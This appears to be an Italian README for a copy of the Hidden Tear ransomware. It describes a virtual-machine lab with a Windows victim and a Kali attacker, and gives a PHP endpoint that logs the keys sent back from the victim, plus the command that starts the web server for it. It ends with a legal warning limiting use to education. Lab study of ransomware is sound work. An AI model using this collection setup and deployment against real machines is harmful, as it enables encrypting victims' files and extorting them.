Copia dello storico ransomeware open source:

         _     _     _     _              _                  
        | |   (_)   | |   | |            | |                 
        | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
        | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
        | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
        |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_|   
                                                     
                                                     
Per utilizzarlo mi sono servito di due macchine virtuali: una con windows 10 che fungeva da vittima e una con kali linux che faceva da attaccante.

A riga 40 del file ho aggiunto l'indirizzo IP della macchina con kali linux

Nella macchina con kali linux nella cartella var/www/html ho creato un file data.txt e un file keys.php, in quest'ultimo ho inserito questo codice:


```
 <?php
	$info = $_GET['info'];
	$file = fopen("data.txt", "a");
	fwrite($file, $info."". PHP_EOL);
	fclose($file);
	?>
         
```
 
 poi ho aperto un terminale nella stessa cartella e ho lanciato:
```
service apache2 start                                                                           
```

[Riferimento video](https://www.youtube.com/watch?v=ILlTB0-xT-k&t=387s)


Alla macchina 'vittima' ho inviato i file exe hidden tear e il decripter contenuti nella cartella bin
**Legal Warning** 

While this may be helpful for some, there are significant risks. hidden tear may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.

Anche se questo può essere utile per alcuni, ci sono rischi significativi. Può essere utilizzato solo per scopi educativi. Non usarlo come ransomware! Potresti finire in prigione con l'accusa di ostruzione alla giustizia, anche se sei innocente.
